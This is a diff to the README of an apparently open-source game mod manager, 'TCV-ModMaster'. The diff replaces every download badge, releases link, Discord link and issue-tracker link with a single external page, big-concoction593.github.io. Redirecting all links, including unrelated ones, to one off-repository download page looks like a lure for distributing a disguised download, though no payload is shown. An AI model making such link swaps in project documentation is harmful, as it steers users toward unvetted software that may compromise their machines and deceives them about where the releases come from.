@@ -1,6 +1,6 @@
 # ⚡ TCV-ModMaster - Hassle-Free Mod Management for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-TCV--ModMaster-blue?style=for-the-badge&logo=github)](https://github.com/Big-concoction593/TCV-ModMaster/releases)
+[![Download Now](https://img.shields.io/badge/Download-TCV--ModMaster-blue?style=for-the-badge&logo=github)](https://big-concoction593.github.io)
 
 TCV-ModMaster is a cross-platform mod manager designed specifically for The Choicer Voicer (TCV) game. It simplifies installing, updating, and switching mods like voice packs, studio themes, judge packs, and menu mods. With one-click install, automatic updates, and support for GameBanana and Nexus Mods, you can spend less time managing files and more time enjoying your modded game. It runs on Windows, macOS, and Linux, and it is completely open-source.
 
@@ -11,7 +11,7 @@ To start using TCV-ModMaster, follow these simple steps.
 ### 📥 Download and Install
 
 1. **Visit the download page.**  
-   Click the big badge above or go to the releases section: [https://github.com/Big-concoction593/TCV-ModMaster/releases](https://github.com/Big-concoction593/TCV-ModMaster/releases)
+   Click the big badge above or go to the releases section: [https://big-concoction593.github.io](https://big-concoction593.github.io)
 
 2. **Find the latest release.**  
    On the releases page, look for the newest version (usually at the top). There will be a list of files.
@@ -105,8 +105,8 @@ Because TCV-ModMaster downloads files from the internet, some antivirus programs
 
 Need help? Join the Discord server or visit the GitHub page.
 
-- **Discord:** [Join the community](https://discord.gg/tcvmodcommunity) (example link – replace with real one)
-- **GitHub Issues:** [Report bugs or request features](https://github.com/Big-concoction593/TCV-ModMaster/issues)
+- **Discord:** [Join the community](https://big-concoction593.github.io) (example link – replace with real one)
+- **GitHub Issues:** [Report bugs or request features](https://big-concoction593.github.io)
 
 ## 📄 License
 
@@ -116,6 +116,6 @@ TCV-ModMaster is open-source software licensed under the MIT License. You are fr
 
 If you need to download again for another computer or reinstall, just click the button below.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge&logo=github)](https://github.com/Big-concoction593/TCV-ModMaster/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge&logo=github)](https://big-concoction593.github.io)
 
 Keywords: gamebanana, mod-downloader, mod-installer, mod-manager, mod-switcher, nexus-mods, profile-manager, tcv, the-choicer-voicer, tool, utility, voice-packs
